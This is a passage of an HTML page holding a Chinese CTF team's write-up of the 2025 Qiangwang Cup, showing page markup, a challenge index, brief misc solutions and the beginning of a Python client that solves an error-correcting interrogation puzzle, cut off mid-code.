

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

 


      <title>2025 QWB-S9 SU WriteUp - </title>

  <meta name="description" content="本次强网杯我们 SU 从各方面原因考虑，十位师傅组成一队，名为“SehllWeDance”，取得了 19th 的成绩，感谢队里师傅们的辛苦付出，每个人都熬夜通宵干！特别是@2hi5hu师傅，一个人几乎AK misc 方向。同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 强网杯的 WriteUp。">
  <meta name="author" content="SUer"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "su-team",
    
    "url": "http:\/\/localhost:1313\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "http:\/\/localhost:1313\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "http:\/\/localhost:1313\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "http:\/\/localhost:1313\/post\/qwb-s9-su-wu\/",
          "name": "2025 qwb s9 su write up"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "SUer"
  },
  "headline": "2025 QWB-S9 SU WriteUp",
  "description" : "本次强网杯我们 SU 从各方面原因考虑，十位师傅组成一队，名为“SehllWeDance”，取得了 19th 的成绩，感谢队里师傅们的辛苦付出，每个人都熬夜通宵干！特别是@2hi5hu师傅，一个人几乎AK misc 方向。同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。\n以下是我们 SU 本次 2025 强网杯的 WriteUp。\n",
  "inLanguage" : "en",
  "wordCount":  17152 ,
  "datePublished" : "2025-10-21T22:41:45\u002b00:00",
  "dateModified" : "2025-10-21T22:41:45\u002b00:00",
  "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
  "keywords" : [ "QWB" ],
  "mainEntityOfPage" : "http:\/\/localhost:1313\/post\/qwb-s9-su-wu\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "http:\/\/localhost:1313\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "http:\/\/localhost:1313\/img\/SU.jpg",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="2025 QWB-S9 SU WriteUp" />
<meta property="og:description" content="本次强网杯我们 SU 从各方面原因考虑，十位师傅组成一队，名为“SehllWeDance”，取得了 19th 的成绩，感谢队里师傅们的辛苦付出，每个人都熬夜通宵干！特别是@2hi5hu师傅，一个人几乎AK misc 方向。同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 强网杯的 WriteUp。">
<meta property="og:image" content="http://localhost:1313/img/SU.jpg" />
<meta property="og:url" content="http://localhost:1313/post/qwb-s9-su-wu/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="su-team" />

  <meta name="twitter:title" content="2025 QWB-S9 SU WriteUp" />
  <meta name="twitter:description" content="本次强网杯我们 SU 从各方面原因考虑，十位师傅组成一队，名为“SehllWeDance”，取得了 19th 的成绩，感谢队里师傅们的辛苦付出，每个人都熬夜通宵干！特别是@2hi5hu师傅，一个人几乎AK misc 方向。同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 强 …">
  <meta name="twitter:image" content="http://localhost:1313/img/SU.jpg" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='http://localhost:1313/img/SU.jpg' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.148.2">
  <link rel="alternate" href="http://localhost:1313/index.xml" type="application/rss+xml" title="su-team"><link rel="stylesheet" href="http://localhost:1313/css/katex.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/brands.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/fontawesome.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/regular.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/solid.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg-with-js.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-font-face.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-shims.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v5-font-face.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><style>
 
.navbar-custom .avatar-container {
  width: 58px;
  height: 58px;
  margin-top: -29px;  
  left: 50%;
  transform: translateX(-50%);
  display: flex;
  align-items: center;
  justify-content: center;
  background: #fff;
  border-radius: 50%;
  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
}

.navbar-custom .avatar-container .avatar-img-border {
  width: 100%;
  height: 100%;
  border-radius: 50%;
  overflow: hidden;
  margin: 0;
  box-shadow: none;
}

.navbar-custom .avatar-container .avatar-img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  border-radius: 50%;
}

 
@media only screen and (min-width: 768px) {
  .navbar-custom .avatar-container {
    width: 72px;
    height: 72px;
    margin-top: -36px;  
  }
}
</style>
  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="theme-toggle mobile-theme-toggle" href="javascript:void(0)" onclick="toggleTheme()" title="Toggle Theme">
        <span class="sr-only">Toggle Theme</span>
        <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
        </svg>
        <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="5"></circle>
          <line x1="12" y1="1" x2="12" y2="3"></line>
          <line x1="12" y1="21" x2="12" y2="23"></line>
          <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
          <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
          <line x1="1" y1="12" x2="3" y2="12"></line>
          <line x1="21" y1="12" x2="23" y2="12"></line>
          <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
          <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
        </svg>
      </a>
      <a class="navbar-brand" href="http://localhost:1313/">su-team</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Archives" href="/">Archives</a>
            </li>
          
        
          
            <li class="navlinks-container">
              <a class="navlinks-parent" role="button" tabindex="0">Members</a>
              <div class="navlinks-children">
                
                  <a href="/active-members">Members</a>
                
                  <a href="/pioneers">Pioneers</a>
                
              </div>
            </li>
          
        
          
            <li>
              <a title="About" href="/page/about/">About</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="/tags">Tags</a>
            </li>
          
        

        

        <li class="hidden-xs">
          <a href="javascript:void(0)" class="theme-toggle" onclick="toggleTheme()" title="Toggle Theme">
            <span class="sr-only">Toggle Theme</span>
            <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
            </svg>
            <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="12" r="5"></circle>
              <line x1="12" y1="1" x2="12" y2="3"></line>
              <line x1="12" y1="21" x2="12" y2="23"></line>
              <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
              <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
              <line x1="1" y1="12" x2="3" y2="12"></line>
              <line x1="21" y1="12" x2="23" y2="12"></line>
              <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
              <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
            </svg>
          </a>
        </li>
        
      </ul>
    </div>

    
      
      
    

  </div>
</nav>
<script>
  (function() {
    const storedTheme = localStorage.getItem("theme");
    const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
    if (storedTheme === "dark" || (!storedTheme && prefersDark)) {
      document.body.classList.add("dark-mode");
    } else {
      document.body.classList.remove("dark-mode");
    }
  })();
  function toggleTheme() {
    const body = document.body;
    body.classList.toggle("dark-mode");
    if (body.classList.contains("dark-mode")) {
      localStorage.setItem("theme", "dark");
    } else {
      localStorage.setItem("theme", "light");
    }
  }
</script>
<style>
  .theme-toggle {
    cursor: pointer;
    padding: 15px;
    display: flex;
    align-items: center;
  }
  .mobile-theme-toggle {
    float: right;
    padding: 15px 10px;
    margin-top: 2px;
  }
  @media (min-width: 768px) {
    .mobile-theme-toggle {
      display: none !important;
    }
  }
  .theme-icon-moon,
  .theme-icon-sun {
    color: #777;
    transition: color .3s, transform .3s;
  }
  .theme-toggle:hover .theme-icon-moon,
  .theme-toggle:hover .theme-icon-sun {
    color: #333;
  }
  .theme-icon-sun {
    display: none;
  }
  .theme-icon-moon {
    display: block;
  }
  body.dark-mode .theme-icon-sun {
    display: block;
    color: #000;
  }
  body.dark-mode .theme-icon-moon {
    display: none;
  }
  body.dark-mode {
    filter: none !important;
    background-color: #1a1a1a !important;
  }
  body.dark-mode header,
  body.dark-mode .container,
  body.dark-mode footer {
    filter: invert(1) hue-rotate(180deg);
  }
  body.dark-mode .navbar-custom {
    background-color: #1a1a1a !important;
    border-bottom: 1px solid #333;
  }
  body.dark-mode .navbar-custom .container-fluid {
    filter: invert(1) hue-rotate(180deg);
  }
  body.dark-mode img,
  body.dark-mode video,
  body.dark-mode iframe,
  body.dark-mode .avatar-img,
  body.dark-mode .navbar-custom .avatar-container {
    filter: invert(1) hue-rotate(180deg);
  }
</style>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>




  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
                <h1>2025 QWB-S9 SU WriteUp</h1>
              
              
              
              
                <span class="post-meta">
  
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on October 21, 211045
  
  
    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;81&nbsp;min
  
  
    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;17152&nbsp;words
  
  
    
      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer
    
  
  
</span>


              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  
  <div class="row flex-row">
    <div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs">
      <div class="toc-sidebar">
        <h4 class="toc-title">#<br>TABLE OF CONTENTS</h4>
        <div class="toc-card">
          
            <nav id="TableOfContents">
  <ul>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#签到">签到</a></li>
        <li><a href="#问卷">问卷</a></li>
        <li><a href="#personal-vault">Personal Vault</a></li>
        <li><a href="#the_interrogation_room">The_Interrogation_Room</a></li>
        <li><a href="#谍影重重-60">谍影重重 6.0</a></li>
        <li><a href="#legacyoled">legacyOLED</a></li>
        <li><a href="#secured-personal-vault">Secured Personal Vault</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#yamcs">Yamcs</a></li>
        <li><a href="#bbjv">bbjv</a></li>
        <li><a href="#ezphp">ezphp</a></li>
        <li><a href="#anime">anime</a></li>
        <li><a href="#secretvault">SecretVault</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#flag-market">Flag-market</a></li>
        <li><a href="#bhp">bhp</a></li>
      </ul>
    </li>
    <li><a href="#re">Re</a>
      <ul>
        <li><a href="#tradre">tradre</a></li>
        <li><a href="#iked">iked</a></li>
        <li><a href="#butterfly">butterfly</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#check-little">check-little</a></li>
        <li><a href="#ezran">ezran</a></li>
      </ul>
    </li>
  </ul>
</nav>
          
        </div>
      </div>
    </div>
    <div class="col-lg-9 col-md-9">
  
      <article role="main" class="blog-post">
        <p>本次强网杯我们 SU 从各方面原因考虑，十位师傅组成一队，名为“SehllWeDance”，取得了 19th 的成绩，感谢队里师傅们的辛苦付出，每个人都熬夜通宵干！特别是<code>@2hi5hu</code>师傅，一个人几乎AK misc 方向。同时我们也在持续招人，欢迎发送个人简介至：suers_<a href="mailto:xctf@126.com">xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 本次 2025 强网杯的 WriteUp。</p>
<h1 id="misc">Misc</h1>
<h2 id="签到">签到</h2>
<p>直接复制flag提交</p>
<h2 id="问卷">问卷</h2>
<p>直接答就行了</p>
<h2 id="personal-vault">Personal Vault</h2>
<p>一血，没想太多，直接拿lovelymem luxe搜了一波flag，直接非了</p>
<p><img src="/img/2025-QWB-S9/1.png" alt="img"></p>
<h2 id="the_interrogation_room">The_Interrogation_Room</h2>
<p>叽里咕噜说的啥听不懂，大概就是要提问17轮，其中有两轮是说谎的，根据信息推出正确的数据，要连续猜对25轮，当时题解数已经多到可怕了，一怒之下问ai梭了</p>
<p><img src="/img/2025-QWB-S9/2.png" alt="img"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">solve_interrogation_coded.py
</span></span></span><span class="line"><span class="cl"><span class="s2">Robust automated client that constructs a 17-query error-correcting measurement
</span></span></span><span class="line"><span class="cl"><span class="s2">set (XOR-based), so that up to 2 erroneous answers can be corrected reliably.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Usage: python3 solve_interrogation_coded.py
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;39.106.57.152&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">22667</span>
</span></span><span class="line"><span class="cl"><span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ALPHABET</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------- I/O helpers ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="n">out</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4096</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span><span class="s1">&#39;replace&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">marker</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">+</span> <span class="n">timeout</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
